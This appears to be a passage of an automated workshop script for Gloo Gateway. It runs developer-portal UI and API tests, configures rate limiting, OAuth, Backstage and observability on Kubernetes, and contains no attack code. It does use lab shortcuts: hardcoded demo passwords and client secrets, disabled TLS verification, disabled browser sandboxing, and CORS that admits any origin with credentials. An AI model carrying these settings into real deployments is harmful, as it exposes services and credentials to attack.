    await devPortalAdminSubscriptionsPage.addCustomMetadata('app', 'bookinfo');
  });

  it("logout and login as user1", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it('user1 should be able to create an API key', async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    
    // Create the API key and get its value
    const apiKey = await devPortalAppsPage.createApiKey('key1');
    
    // write API key to a file
    fs.writeFileSync('apiKey', apiKey);
  });
  
  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
export API_KEY=$(cat apiKey)
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API authorized", () => {
  it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-authorized.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: dynamic
  namespace: gloo-system
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: generic_key
            value: counter
        rateLimit:
          requestsPerUnit: 100
          unit: SECOND
    rateLimits:
    - setActions:
      - genericKey:
          descriptorValue: counter
      limit:
        dynamicMetadata:
          metadataKey:
            key: "envoy.filters.http.ext_authz"
            path:
            - key: "portal"
            - key: "rateLimit"
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
    # Rate limit configuration
    rateLimitConfigs:
      refs:
      - name: dynamic
        namespace: gloo-system
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 429 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-rate-limited.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
helm repo add gloo-portal-idp-connect https://storage.googleapis.com/gloo-mesh-enterprise/gloo-portal-idp-connect

helm upgrade -i -n gloo-system \
  portal-idp gloo-portal-idp-connect/gloo-portal-idp-connect \
  --version 0.3.0 \
  --kube-context $CLUSTER1 \
  -f -<<EOF
connector: keycloak
keycloak:
  realm: http://keycloak.keycloak.svc.cluster.local:8080/realms/portal-mgmt
  mgmtClientId: gloo-portal-idp
  mgmtClientSecret: gloo-portal-idp-secret
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo-portal-idp-connect
helm upgrade -i -n gloo-system \
  gloo-gateway gloo-ee-helm/gloo-ee \
  --create-namespace \
  --version 1.19.1 \
  --kube-context ${CLUSTER1} \
  --reuse-values \
  -f -<<EOF
gateway-portal-web-server:
  enabled: true
  glooPortalServer:
    idpServerUrl: http://idp-connect.gloo-system.svc.cluster.local
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gateway-portal-web-server
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - name: oauth2
      oauth2:
        accessTokenValidation:
          jwt:
            remoteJwks:
              url: ${KEYCLOAK_URL}/realms/portal-mgmt/protocol/openid-connect/certs
    - name: portal
      portalAuth:
        url: http://gateway-portal-web-server.gloo-system.svc.cluster.local:8080
        cacheDuration: 60s
        redisOptions:
          host: redis:6379
EOF
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const DeveloperPortalTeamsPage = require('./tests/pages/dev-portal/teams-page');
const DeveloperPortalAppsPage = require('./tests/pages/dev-portal/apps-page');
const DeveloperPortalAdminSubscriptionsPage = require('./tests/pages/dev-portal/admin-subscriptions-page');
const DeveloperPortalAdminAppsPage = require('./tests/pages/dev-portal/admin-apps-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;
const fs = require('fs');

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI oauth", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let devPortalTeamsPage;
  let devPortalAppsPage;
  let devPortalAdminSubscriptionsPage;
  let devPortalAdminAppsPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    devPortalTeamsPage = new DeveloperPortalTeamsPage(page);
    devPortalAppsPage = new DeveloperPortalAppsPage(page);
    devPortalAdminSubscriptionsPage = new DeveloperPortalAdminSubscriptionsPage(page);
    devPortalAdminAppsPage = new DeveloperPortalAdminAppsPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it('user1 should be able to create an OAuth client', async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    
    // Create the API key and get its value
    const oauthClient = await devPortalAppsPage.createOAuthClient();
    
    // write API key to a file
    fs.writeFileSync('oauthClient', JSON.stringify(oauthClient));
  });
  
  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests-oauth.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
export CLIENT_ID=$(cat oauthClient | jq -r .clientId)
export CLIENT_SECRET=$(cat oauthClient | jq -r .clientSecret)
export APP_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=${CLIENT_ID}" \
  -d "client_secret=${CLIENT_SECRET}" \
  -d "grant_type=client_credentials" \
  "$KEYCLOAK_URL/realms/portal-mgmt/protocol/openid-connect/token" |
  jq -r .access_token)

echo export APP_TOKEN=${APP_TOKEN}
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.APP_TOKEN}], retCode: 429 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-oauth.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: ListenerOption
metadata:
  name: access-logging
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: Gateway
    name: http
  options:
    accessLoggingService:
      accessLog:
      - fileSink:
          path: /dev/stdout
          jsonFormat:
            "timestamp": "%START_TIME%"
            "server_name": "%REQ(:AUTHORITY)%"
            "response_duration": "%DURATION%"
            "request_command": "%REQ(:METHOD)%"
            "request_uri": "%REQ(X-ENVOY-ORIGINAL-PATH?:PATH)%"
            "request_protocol": "%PROTOCOL%"
            "status_code": "%RESPONSE_CODE%"
            "client_address": "%DOWNSTREAM_REMOTE_ADDRESS_WITHOUT_PORT%"
            "x_forwarded_for": "%REQ(X-FORWARDED-FOR)%"
            "bytes_sent": "%BYTES_SENT%"
            "bytes_received": "%BYTES_RECEIVED%"
            "user_agent": "%REQ(USER-AGENT)%"
            "downstream_local_address": "%DOWNSTREAM_LOCAL_ADDRESS%"
            "requested_server_name": "%REQUESTED_SERVER_NAME%"
            "request_id": "%REQ(X-REQUEST-ID)%"
            "response_flags": "%RESPONSE_FLAGS%"
            "route_name": "%ROUTE_NAME%"
            "upstream_cluster": "%UPSTREAM_CLUSTER%"
            "upstream_host": "%UPSTREAM_HOST%"
            "upstream_local_address": "%UPSTREAM_LOCAL_ADDRESS%"
            "upstream_service_time": "%REQ(x-envoy-upstream-service-time)%"
            "upstream_transport_failure_reason": "%UPSTREAM_TRANSPORT_FAILURE_REASON%"
            "correlation_id": "%REQ(X-CORRELATION-ID)%"
            "extauth": "%DYNAMIC_METADATA(envoy.filters.http.ext_authz)%"
            "api_version": "%DYNAMIC_METADATA(io.solo.gloo.portal:api_version)%"
            "api_product_id": "%DYNAMIC_METADATA(io.solo.gloo.portal:api_product_id)%"
            "api_product_name": "%DYNAMIC_METADATA(io.solo.gloo.portal:api_product_name)%"
            "lifecycle_phase": "%DYNAMIC_METADATA(io.solo.gloo.portal.custom_metadata:lifecyclePhase)%"
EOF
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Monetization is working", () => {
  it('Response contains all the required monetization fields', () => {
    const response = helpers.getOutputForCommand({ command: `curl -k -H "Authorization: Bearer ${process.env.USER1_TOKEN}" https://bookinfo.example.com/api/bookinfo/v1` });
    const output = JSON.parse(helpers.getOutputForCommand({ command: `kubectl --context ${process.env.CLUSTER1} -n gloo-system logs deploy/gloo-proxy-http --tail 1` }));
    expect(output.api_product_id).to.equals("bookinfo");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-monetization/tests/monetization.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=150 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
kubectl --context ${CLUSTER1} apply -f data/steps/dev-portal-backstage-backend/rbac.yaml

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: backstage
  namespace: gloo-system
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backstage
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backstage
  template:
    metadata:
      labels:
        app: backstage
    spec:
      serviceAccountName: backstage
      containers:
        - name: backstage
          image: gcr.io/product-excellence-424719/portal-backstage-backend:v0.0.35
          imagePullPolicy: IfNotPresent
          ports:
            - name: http
              containerPort: 7007
          envFrom:
            - secretRef:
                name: postgres-secrets
          env:
          - name: PORTAL_DEBUG_LOGGING
            value: "true"
          - name: PORTAL_SERVER_URL
            value: "http://gateway-portal-web-server.gloo-system:8080/v1"
          - name: CLIENT_ID
            value: ${KEYCLOAK_CLIENT}
          - name: CLIENT_SECRET
            value: ${KEYCLOAK_SECRET}
          - name: SA_CLIENT_ID
            value: ${KEYCLOAK_CLIENT}
          - name: SA_CLIENT_SECRET
            value: ${KEYCLOAK_SECRET}
          - name: APP_CONFIG_backend_baseUrl
            value: https://backstage.example.com
          - name: TOKEN_ENDPOINT
            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/token"
          - name: AUTH_ENDPOINT
            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/auth"
          - name: LOGOUT_ENDPOINT
            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/logout"
          - name: NODE_TLS_REJECT_UNAUTHORIZED
            value: "0"
          - name: POSTGRES_HOST
            value: postgres
          - name: POSTGRES_PORT
            value: "5432"
          - name: PORTAL_SYNC_FREQUENCY_SECONDS
            value: "10"
---
apiVersion: v1
kind: Service
metadata:
  name: backstage
  namespace: gloo-system
spec:
  selector:
    app: backstage
  ports:
    - name: http
      port: 80
      targetPort: http
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy backstage
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: backstage
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "backstage.example.com"
  rules:
    - backendRefs:
        - name: backstage
          port: 80
      matches:
      - path:
          type: PathPrefix
          value: /
EOF
./scripts/register-domain.sh backstage.example.com ${PROXY_IP}
echo -n Waiting for Backstage to finish processing APIs...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n gloo-system logs -l app=backstage 2>/dev/null | grep \"Transformed APIs into new entities\") ]]; do
  sleep 5
  echo -n .
done
echo"
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
const puppeteer = require('puppeteer');
var chai = require('chai');
var expect = chai.expect;

describe("APIs displayed properly in backstage", function() {
  let browser;
  let html;

  // Use Mocha's 'before' hook to set up Puppeteer
  beforeEach(async function() {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 40,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'], // needed for instruqt
    });
    let page = await browser.newPage();
    await page.goto(`https://backstage.example.com/api-docs`);
    await page.waitForNetworkIdle({ options: { timeout: 1000 } });

    await page.click('button');

    await page.waitForNavigation({ waitUntil: 'networkidle0' });

    html = await page.content();
  });

  // Use Mocha's 'after' hook to close Puppeteer
  afterEach(async function() {
    await browser.close();
  });

  it("The page contains bookinfo", () => {
    expect(html).to.contain("bookinfo");
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backstage-backend/tests/backstage-apis.test.js.liquid from lab number 32"
timeout --signal=INT 6m mocha ./test.js --timeout 10000 --retries=250 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 32"; exit 1; }
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("ExternalDNS dns entry validation", () => {
    it('backstage.example.com resolves to ' + process.env.PROXY_IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
        return dns.resolve('backstage.example.com', (error, address) => {
            if (!error) {
                expect(address.toString()).to.be.eq(process.env.PROXY_IP);
            }
            done(error);
        });
    });
});

EOF
echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 32"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 32"; exit 1; }
helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
helm repo update

helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
--version 0.97.1 \
--set mode=deployment \
--set image.repository="otel/opentelemetry-collector-contrib" \
--set command.name="otelcol-contrib" \
--namespace=otel \
--create-namespace \
-f -<<EOF
clusterRole:
  create: true
  rules:
  - apiGroups:
    - ''
    resources:
    - 'pods'
    - 'nodes'
    verbs:
    - 'get'
    - 'list'
    - 'watch'
ports:
  promexporter:
    enabled: true
    containerPort: 9099
    servicePort: 9099
    protocol: TCP
config:
  receivers:
    prometheus/gloo-dataplane:
      config:
        scrape_configs:
        # Scrape the Gloo Gateway pods
        - job_name: gloo-gateways
          honor_labels: true
          kubernetes_sd_configs:
          - role: pod
          relabel_configs:
            - action: keep
              regex: kube-gateway
              source_labels:
              - __meta_kubernetes_pod_label_gloo
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
              action: keep
              regex: true
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
              action: replace
              target_label: __metrics_path__
              regex: (.+)
            - action: replace
              source_labels:
              - __meta_kubernetes_pod_ip
              - __meta_kubernetes_pod_annotation_prometheus_io_port
              separator: ':'
              target_label: __address__
            - action: labelmap
              regex: __meta_kubernetes_pod_label_(.+)
            - source_labels: [__meta_kubernetes_namespace]
              action: replace
              target_label: kube_namespace
            - source_labels: [__meta_kubernetes_pod_name]
              action: replace
              target_label: pod
    prometheus/gloo-controlplane:
      config:
        scrape_configs:
        # Scrape the Gloo pods
        - job_name: gloo-gateways
          honor_labels: true
          kubernetes_sd_configs:
          - role: pod
          relabel_configs:
            - action: keep
              regex: gloo
              source_labels:
              - __meta_kubernetes_pod_label_gloo
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
              action: keep
              regex: true
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
              action: replace
              target_label: __metrics_path__
              regex: (.+)
            - action: replace
              source_labels:
              - __meta_kubernetes_pod_ip
              - __meta_kubernetes_pod_annotation_prometheus_io_port
              separator: ':'
              target_label: __address__
            - action: labelmap
              regex: __meta_kubernetes_pod_label_(.+)
            - source_labels: [__meta_kubernetes_namespace]
              action: replace
              target_label: kube_namespace
            - source_labels: [__meta_kubernetes_pod_name]
              action: replace
              target_label: pod
  exporters:
    prometheus:
      endpoint: 0.0.0.0:9099
    debug: {}
  service:
    pipelines:
      metrics:
        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
        processors: [batch]
        exporters: [prometheus]
EOF
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update

helm upgrade --install kube-prometheus-stack \
prometheus-community/kube-prometheus-stack \
--version 61.2.0 \
--namespace monitoring \
--create-namespace \
--values - <<EOF
grafana:
  service:
    type: LoadBalancer
    port: 3000
prometheus:
  prometheusSpec:
    ruleSelectorNilUsesHelmValues: false
    serviceMonitorSelectorNilUsesHelmValues: false
    podMonitorSelectorNilUsesHelmValues: false
EOF
cat <<EOF | kubectl apply -n otel -f -
apiVersion: monitoring.coreos.com/v1
kind: PodMonitor
metadata:
  name: otel-monitor
spec:
  podMetricsEndpoints:
  - interval: 30s
    port: promexporter
    scheme: http
  selector:
    matchLabels:
      app.kubernetes.io/name: opentelemetry-collector
EOF
kubectl -n monitoring create cm envoy-dashboard \
--from-file=data/steps/deploy-otel-collector/envoy.json
kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):3000"
